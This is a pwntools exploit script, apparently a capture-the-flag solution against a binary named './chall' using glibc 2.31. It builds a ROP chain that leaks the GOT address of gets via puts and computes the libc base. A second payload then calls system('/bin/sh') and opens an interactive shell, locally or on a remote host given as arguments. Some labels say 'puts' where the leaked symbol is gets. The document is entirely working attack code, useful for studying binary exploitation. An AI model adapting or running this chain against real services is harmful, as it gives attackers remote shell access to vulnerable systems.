from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:  
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './chall'
library = './libc6_2.31-0ubuntu9.9_amd64.so'
libc = ELF(library, checksec=False)
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'
rop = ROP(elf, checksec=False)
context.log_level = 'debug'
offset = 24
sh = start()
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]
info(f'POP RDI GADGET -> {hex(pop_rdi)}')
payload = flat (
    asm('nop') * offset,
    pop_rdi,
    elf.got['gets'],
    elf.plt['puts'],
    elf.sym['main']
)
sh.sendlineafter(b': ', payload)
sh.recvline()
sh.recvline()
# sh.recvline()
# sh.recvline()
get = sh.recvline().strip()
# get = unpack(sh.recv(6) * 2 + b'\x00' * 2)
leaked_puts = unpack(get.ljust(8,b'\x00'))
# leaked_puts = unpack(sh.recv(6) * 2 + b'\x00' * 2)
# print(get)
info(f'leaked puts -> {hex(leaked_puts)}')
pause()
# print(get)
libc.address = leaked_puts - libc.sym['gets']
info(f'Puts Base -> {hex(libc.address)}')
payload2 = flat(
    asm('nop') * offset,
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    ret_gadget,
    libc.sym['system']
)
sh.sendlineafter(b': ', payload2)
# sh.sendlineafter(b'>> ', b'2')
# sh.sendlineafter(b'= ', b' ') 
# sh.sendlineafter(b'(y/n): ', payload2)
sh.interactive()